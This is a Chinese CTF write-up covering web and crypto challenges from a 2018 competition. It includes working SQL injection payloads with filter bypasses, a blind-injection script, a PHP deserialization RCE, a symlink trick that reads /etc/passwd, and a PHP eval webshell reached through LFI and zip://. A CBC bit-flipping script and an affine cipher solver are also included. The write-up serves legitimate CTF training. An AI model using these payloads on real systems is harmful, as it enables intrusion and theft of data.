# 2018安恒杯11月赛-Web&Crypto题解

阅读量 **516329**

|评论 **19**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-11-26 10:02:02

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 前言

今天比赛繁多，在打xnuca的闲暇，做了下安恒月赛，以下是Web和Crypto的解题记录

## 签到旧题-手速要快

拿到题目后，发现要输入一个Password

![](https://p3.ssl.qhimg.com/t012ad11730773eb204.png)

在header里发现密码

![](https://p0.ssl.qhimg.com/t0175168a629b4327db.png)

输入后发现来到上传页面

![](https://p3.ssl.qhimg.com/t01767940b4a290e2b8.png)

发现可以上传成功

![](https://p1.ssl.qhimg.com/t0166d1e8e8f84acbcc.png)

并且可以被解析为php

![](https://p5.ssl.qhimg.com/t01d49ee63dfdaf3ec9.png)

于是getflag

![](https://p0.ssl.qhimg.com/t010d02210e851b3044.png)

![](https://p4.ssl.qhimg.com/t01e0179196577dd008.png)

## ezsql

打开页面，发现只有注册，登录功能，然后就是个人信息页面

    
    
    http://101.71.29.5:10024/user/user.php?id=5
    

随手测试了一下，发现存在sql注入

    
    
    http://101.71.29.5:10024/user/user.php?id=if(1,1,2)
    

![](https://p5.ssl.qhimg.com/t0111372d8721670ee0.png)

    
    
    http://101.71.29.5:10024/user/user.php?id=if(0,1,2)
    

![](https://p0.ssl.qhimg.com/t01183101d79cb214a9.png)

但这里的过滤很坑,首先没有引号，其次是过滤没有回显，我无法通过

    
    
    if(length('a'),1,2)
    

这样的方式去识别过滤，这是我觉得比较头疼的问题

后来在随便测试的时候发现

    
    
    if(hex(database())like(0x25),1,2)
    

![](https://p1.ssl.qhimg.com/t01e1d455f6c842234f.png)

回显正常，随即觉得应该有戏，但是由于过滤太多，依次尝试，发现可以load_file

    
    
    if((hex(load_file(0x2f6574632f706173737764))like(0x25)),1,2)
    

尝试读了一下/etc/passwd

发现成功，于是想到读/var/www/html/index.php

然后得到文件内容

    
    
    <?php 
    require_once('config/sys_config.php');
    require_once('header.php');
    if(isset($_COOKIE['CONFIG'])){
        $config = $_COOKIE['CONFIG'];
        require_once('config/config.php');
    }
    ?>
    

然后读/var/www/html/config.php

得到文件内容

    
    
    <?php
    $config = unserialize(base64_decode($config));
    if(isset($_GET['p'])){
        $p=$_GET['p'];
        $config->$p;
    }
    class Config{
        private $config;
        private $path;
        public $filter;
        public function __construct($config=""){
            $this->config = $config;
            echo 123;
        }
        public function getConfig(){
            if($this->config == ""){
                $config = isset($_POST['config'])?$_POST['config']:"";
            }
        }
        public function SetFilter($value){
    //        echo $value;
        $value=waf_exec($value); 
            var_dump($value);
        if($this->filter){
                foreach($this->filter as $filter){
                    $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);
                }
                $this->filter = array();
            }else{
                return false;
            }
            return true;
        }
        public function __get($key){
            //var_dump($key);
        $this->SetFilter($key);
            die("");
        }
    }
    

发现是一波反序列化的操作，注意到函数

    
    
       public function __get($key){
            //var_dump($key);
        $this->SetFilter($key);
            die("");
        }
    

以及

    
    
    if(isset($_GET['p'])){
        $p=$_GET['p'];
        $config->$p;
    }
    

发现可控值，跟踪SetFilter

发现

    
    
        $value=waf_exec($value); 
            var_dump($value);
        if($this->filter){
                foreach($this->filter as $filter){
                    $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);
    

发现可进行RCE的位置，于是尝试构造

    
    
    $sky = new Config();
    $sky->filter = array('system');
    echo base64_encode(serialize($sky));
    

![](https://p3.ssl.qhimg.com/t010df7e65f61bc91d6.png)

发现成功列目录，但是在尝试读取flag的时候出现问题

首先flag2333是个目录，然后/和空格被过滤，我们列出当前文件夹下所有文件

这里使用$IFS进行绕过空格

![](https://p1.ssl.qhimg.com/t014c420fc5c456c8cb.png)

得到文件名，依旧无法cat，因为没有/，尝试通配符?，发现也被过滤

最后想到grep，如下图

![](https://p1.ssl.qhimg.com/t01f73478c123fd3cb9.png)

即可无需目录名getflag

## interesting web

拿到题目发现

![](https://p2.ssl.qhimg.com/t01062bab8b0fae6f63.png)

需要我们成为管理员，因为普通用户没有用

发现3个功能：注册，登录，找回密码

那么应该是用这3个功能更改管理员密码没错了

我们尝试找回密码

![](https://p0.ssl.qhimg.com/t01ab6b8cea7d60283c.png)

由于目标是flask框架，session是存在cookie里的，我们注意到session

    
    
    eyJsb2dpbiI6dHJ1ZSwidG9rZW4iOnsiIGIiOiJaREk1TTJRMk9XSTBPV1U0WWpNM01EUTFOMk0wWXpjNVpUTTJOek0yTkRVPSJ9LCJ1c2VybmFtZSI6ImFkbWluIn0.DtqVZA.sKvz6PyWEuNzg_FZrRI3RKzoWzk
    

解一下

![](https://p3.ssl.qhimg.com/t01ea3643d08ddcb10a.png)

可以得到token

随机成功更改管理员密码

然后先到tar，不难想到软链接，我们构造

    
    
    ln -s /etc/passwd 222222.jpg
    tar cvfp 1.tar 222222.jpg
    

上传1.tar，即可得到flag

![](https://p1.ssl.qhimg.com/t01b4e4685cc44cf045.png)

## 好黑的黑名单

拿到题目，f12发现

    
    
    http://101.71.29.5:10041/show.php?id=1
    

于是尝试注入，有了前面的经验，直接尝试

    
    
    http://101.71.29.5:10041/show.php?id=if(1,1,2)
    

![](https://p5.ssl.qhimg.com/t01c595005b94e6030f.png)

    
    
    http://101.71.29.5:10041/show.php?id=if(0,1,2)
    

![](https://p1.ssl.qhimg.com/t014a16f269287c3d33.png)

并且发现过滤时

![](https://p1.ssl.qhimg.com/t01cac3a49eea0b93cb.png)

报错时

![](https://p0.ssl.qhimg.com/t01dc898e34b5bf0986.png)

即可得到题目的4种特征

尝试

    
    
    if((database())like(0x25),1,2)
    

发现like被过滤，于是尝试regexp

    
    
    if((database)regexp(0x5e),1,2)
    

fuzz了一下，发现可以得到数据库名为

    
    
    web
    

于是写脚本进行注入

尝试爆表

    
    
    select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()
    

这里遇到问题，=被过滤，like也被过滤

于是想到

    
    
    in(database())
    

但是这里还有坑，需要这样绕过

    
    
    in%0a(database())
    

同时

    
    
    information_schema.TABLES
    

被过滤，需要如下绕过

    
    
    information_schema%0a.%0aTABLES
    

绕过后，即可得到两张表

    
    
    admin,flaggg
    

相同的方式尝试爆字段

    
    
    id,f1agg
    

最后进行flag的提取时出现问题，题目不知道为什么，当regexp匹配数字的时候，就会出现数据库错误，即

![](https://p1.ssl.qhimg.com/t01dc898e34b5bf0986.png)

所以只能得到flag{

这一点非常头疼，在这里卡了1个小时后，想到使用between，例如

![](https://p4.ssl.qhimg.com/t011e36a818efa719e4.png)

根据之前的经验，flag均为md5

于是想到从0~f进行遍历

脚本如下

    
    
    # -*- coding:utf-8 -*-    import requests
    import string
    flag = 'flag{'
    payload=flag.encode('hex')
    list = string.digits+'abcdef'+'}'
    for i in range(1,200):
        print i
        for j in range(len(list)):
            tmp1 = payload+'2f'
            tmp2 = payload+list[j].encode('hex')
            url = 'http://101.71.29.5:10041/show.php?id=if(((select%0af1agg%0afrom%0aflaggg)between%0a0x'+tmp1+'%0aand%0a0x'+tmp2+'),1,2)'
            r = requests.get(url)
            if '郑州烩面的价钱为10' in r.content:
                payload += list[j-1].encode('hex')
                print payload.decode('hex')
                break
    

得到flag

    
    
    flag{5d6352163c30ba51f1e2c0dd08622428}
    

## image_up

    
    
    http://101.71.29.5:10043/index.php?page=login
    

拿到题目发现是个登录页面，且有文件读取的风险，我们尝试读取文件

![](https://p3.ssl.qhimg.com/t016020643e23e0a39d.png)

    
    
    <?php
      if(isset($_POST['username'])&&isset($_POST['password'])){
        header("Location: index.php?page=upload");
        exit();
      }
    ?>
    

随手尝试admin admin，发现登录成功，再读upload的源码

    
    
    <?php
        $error = "";
        $exts = array("jpg","png","gif","jpeg");
        if(!empty($_FILES["image"]))
        {
            $temp = explode(".", $_FILES["image"]["name"]);
            $extension = end($temp);
            if((@$_upfileS["image"]["size"] < 102400))
            {
                if(in_array($extension,$exts)){
                  $path = "uploads/".md5($temp[0].time()).".".$extension;
                  move_uploaded_file($_FILES["image"]["tmp_name"], $path);
                  $error = "上传成功!";
                }
            else{
                $error = "上传失败！";
            }
    
            }else{
              $error = "文件过大，上传失败！";
            }
        }
    
    ?>
    

发现文件上传，这里不难想到组合拳：lfi+upload

我们只要上传一个内容带有一句话木马的jpg，再包含即可getshell

但这里有一个难点

    
    
    $path = "uploads/".md5($temp[0].time()).".".$extension;
    

我们需要提前预测time()

刚开始我以为这是一道简单的time预测，但发现多次尝试多线程爆破，都无法预测到文件名

后来看到提示

![](https://p3.ssl.qhimg.com/t01fd636b691c73227b.png)

想到是不是时区的问题，尝试time+8h

    
    
    time()+8*3600
    

随机可以预测到图片，但是新的问题来了，我们保护图片发现并没有成功，猜想是否强行拼接了.php，于是读index

    
    
    <?php
      if(isset($_GET['page'])){
        if(!stristr($_GET['page'],"..")){
          $page = $_GET['page'].".php";
          include($page);
        }else{
          header("Location: index.php?page=login");
        }
      }else{
        header("Location: index.php?page=login");
      }
    

发现强行拼接了.php，于是想到新的方法

    
    
    zip://
    

走zip协议即可

创建一个sky.php的文件，内容为

    
    
    <?php
    @eval($_POST[sky]);
    

然后压缩为sky.zip，改后缀名为sky.jpg

预测文件名后上传

访问路径

    
    
    http://101.71.29.5:10043/index.php?page=zip://uploads/ddf1dcc4b533d1631d81a0c58a1b3bdb.jpg%23sky
    

即可菜刀连接

![](https://p3.ssl.qhimg.com/t011bcf92b457848f2f.png)

![](https://p3.ssl.qhimg.com/t01af00c612ce8d6ad4.png)

## 好简单的密码2

nc进题目

    
    
    ➜  ~ nc 101.71.29.5 10048
    only admin can get flag!
    Menu:
    1) login
    2) info
    3) edit
    4) flag
    

发现有4个功能，查看了一下

    
    
    2
    iv:235d5e78277087a9cb82b8ea0ca94a47
    cipher:4721f1a3f57ed3d6fcad72461fa54815a0b7f83874919bd79bdc1e0a945c0f95c1a73bcd539f73d29cac53105dbd69bbf71a5fcef01ccaa3f9b6582d96311f47
    plain:7b27757365726e616d655f5f273a202731646d696e272c20276c6f67696e5f74696d655f5f273a20313534333035393335342e3831353837397d303030303030
    3
    new iv(must_be_16_bytes_long):
    235d5e78277087a9cb82b8ea0ca94a47
    new cipher:
    4721f1a3f57ed3d6fcad72461fa54815f0b7f83874919bd79bdc1e0a945c0f95179a145bb62d567082303b27a986e9a407763db55d5dc47c3483060be10b6946
    

发现info，是告诉你iv,c,m，而edit是更改iv和c

瞬间想到cbc翻转攻击

尝试登陆1dmin

    
    
    1
    Please input your username
    1dmin
    login success
    

查看此时的信息

    
    
    2
    iv:235d5e78277087a9cb82b8ea0ca94a47
    cipher:4721f1a3f57ed3d6fcad72461fa54815a0b7f83874919bd79bdc1e0a945c0f95c1a73bcd539f73d29cac53105dbd69bbf71a5fcef01ccaa3f9b6582d96311f47
    plain:7b27757365726e616d655f5f273a202731646d696e272c20276c6f67696e5f74696d655f5f273a20313534333035393335342e3831353837397d303030303030
    

进行c的构造

    
    
    cipher = ord(cipher[0]) ^ ord(‘1’) ^ ord(‘a’)
    

然后修改c

    
    
    3
    new iv(must_be_16_bytes_long):
    235d5e78277087a9cb82b8ea0ca94a47
    new cipher:
    1721f1a3f57ed3d6fcad72461fa54815a0b7f83874919bd79bdc1e0a945c0f95b19686d227341efdc6f68d112c2852f6165f9f345cf01e06095faa150fd430ec
    

此时再看个人信息

    
    
    2
    iv:235d5e78277087a9cb82b8ea0ca94a47
    cipher:1721f1a3f57ed3d6fcad72461fa54815a0b7f83874919bd79bdc1e0a945c0f95b19686d227341efdc6f68d112c2852f6165f9f345cf01e06095faa150fd430ec
    plain:dfdd2d9e4cb84a95a2dd3fcfc9e8627761646d696e272c20276c6f67696e5f74696d655f5f273a20313534333035393435372e3332363233317d303030303030
    

发现明文出现乱码

![](https://p3.ssl.qhimg.com/t01293e532ef6fd76ee.png)

那么通过iv恢复第一个Block

    
    
    plain = 'dfdd2d9e4cb84a95a2dd3fcfc9e86277'.decode('hex')
    want = "{'username__': '"
    first_16 = ''
    iv = '235d5e78277087a9cb82b8ea0ca94a47'.decode('hex')
    for i in range(16):
        first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))
    newiv = first_16
    print newiv.encode('hex')
    

然后去再修改新的iv

    
    
    3
    new iv(must_be_16_bytes_long):
    87a706950ebaa35d043ad87ae27b0817
    new cipher:
    1721f1a3f57ed3d6fcad72461fa54815a0b7f83874919bd79bdc1e0a945c0f95b19686d227341efdc6f68d112c2852f6165f9f345cf01e06095faa150fd430ec
    

即可getflag

    
    
    Menu:
    1) login
    2) info
    3) edit
    4) flag
    4
    only admin can get flag
    username :admin
    flag{cce8a1ec51ac432c774d0198e388b034}
    

脚本如下

    
    
    from Crypto.Cipher import AES
    import base64
    # iv='235d5e78277087a9cb82b8ea0ca94a47'
    # cipher='4721f1a3f57ed3d6fcad72461fa54815a0b7f83874919bd79bdc1e0a945c0f95179a145bb62d567082303b27a986e9a407763db55d5dc47c3483060be10b6946'
    # plain='7b27757365726e616d655f5f273a202731646d696e272c20276c6f67696e5f74696d655f5f273a20313534333035383631322e3136303935367d303030303030'
    # m = plain.decode('hex')
    # # for i in range(0,len(m),16):
    # #     print m[i:i+16]
    # print cipher.encode('hex')
    plain = 'dfdd2d9e4cb84a95a2dd3fcfc9e86277'.decode('hex')
    print plain
    want = "{'username__': '"
    first_16 = ''
    iv = '235d5e78277087a9cb82b8ea0ca94a47'.decode('hex')
    for i in range(16):
        first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))
    newiv = first_16
    print newiv.encode('hex')
    

## 仿射

拿到题目，提示b=7，以及一串密码

    
    
    achjbnpdfherebjsw
    

我们知道仿射密码为

![](https://p0.ssl.qhimg.com/t018b08d78341c47905.jpg)

a的逆元取值范围在(1,9,21,15,3,19,7,23,11,5,17,25)

所以直接解密即可

![](https://p1.ssl.qhimg.com/t011b649f877ec846cc.jpg)

代码如下：

    
    
    import gmpy2
    string = 'achjbnpdfherebjsw'
    b=7
    for i in (1,9,21,15,3,19,7,23,11,5,17,25):
        flag = ''
        for k in string:
            flag += chr(i*((ord(k)-ord('a'))-b)%26+ord('a'))
        print flag
    

![](https://p4.ssl.qhimg.com/t01f79e8083c068271f.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **一叶飘零** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/166492](/post/id/166492)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [Web安全](/tag/Web安全)
  * [crypto](/tag/crypto)

 **+1** __34赞

 __收藏

![](https://p0.ssl.qhimg.com/t0115eb10739cb26739.png) 一叶飘零

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

